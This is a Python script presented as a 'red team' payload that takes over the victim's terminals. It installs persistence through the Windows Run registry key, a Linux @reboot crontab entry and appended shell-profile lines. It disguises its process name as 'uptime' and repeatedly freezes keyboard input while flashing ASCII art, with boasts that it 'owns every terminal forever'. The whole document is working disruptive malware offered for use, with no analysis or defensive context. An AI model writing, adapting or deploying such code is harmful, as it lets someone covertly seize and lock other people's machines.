#!/usr/bin/env python3
# redteam_terminal.py - Ultimate terminal domination
# Works forever. No escape. No sudo.

import os
import sys
import time
import subprocess
import platform

SCRIPT     = os.path.abspath(__file__)
PID_FILE   = os.path.expanduser("~/.rt_pid")
DELAY_FILE = os.path.expanduser("~/.rt_delay")
DEFAULT_DELAY = 60000  # 60 seconds of pain

def get_delay():
    try:
        with open(DELAY_FILE) as f:
            return max(10000, int(f.read().strip()))
    except:
        return DEFAULT_DELAY

def hide_process():
    if platform.system() == "Linux":
        try:
            import ctypes
            ctypes.CDLL("libc.so.6").prctl(15, b"uptime\0", 0, 0, 0)
        except: pass

def install_persistence():
    if os.name == "nt":  # Windows
        try:
            import winreg as reg
            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
            if not os.path.exists(pythonw):
                pythonw = sys.executable
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "SystemService", 0, reg.REG_SZ,
                          f'"{pythonw}" "{SCRIPT}"')
            reg.CloseKey(key)
        except: pass
    else:  # Linux — boot + EVERY new terminal
        # 1. Boot persistence
        line = f"@reboot python3 \"{SCRIPT}\" >/dev/null 2>&1\n"
        try:
            cur = subprocess.check_output("crontab -l 2>/dev/null || true", shell=True).decode()
            if line not in cur:
                subprocess.run("crontab -", shell=True, input=(cur + line).encode())
        except: pass

        # 2. Every new terminal (this is the killer feature)
        cmd = f'python3 "{SCRIPT}" &\n'
        profiles = ["~/.bashrc", "~/.zshrc", "~/.profile"]
        for p in profiles:
            path = os.path.expanduser(p)
            if os.path.exists(path):
                with open(path, "a") as f:
                    f.write("\n" + cmd)
                break

# Giant ASCII art
RED_TEAM = """
\033[91m
██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
\033[0m
"""

def terminal_domination():
    hide_process()

    # Kill any old copy
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE) as f:
                os.kill(int(f.read().strip()), 9)
        except: pass

    # Save PID
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

    # Keyboard freeze on Linux
    if platform.system() == "Linux":
        try:
            import termios, tty
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            frozen = True
        except:
            frozen = False
    else:
        frozen = False

    try:
        while True:
            os.system("clear" if os.name != "nt" else "cls")
            print(RED_TEAM.center(120))

            if frozen:
                tty.setraw(fd)
                time.sleep(get_delay() / 1000)
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
            else:
                time.sleep(get_delay() / 1000)

    except:
        pass
    finally:
        if frozen:
            try: termios.tcsetattr(fd, termios.TCSADRAIN, old)
            except: pass

# ——————— MAIN ———————
if __name__ == "__main__":
    hide_process()

    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        install_persistence()
        print("[+] Red Team payload now owns every terminal forever")
        sys.exit(0)

    terminal_domination()
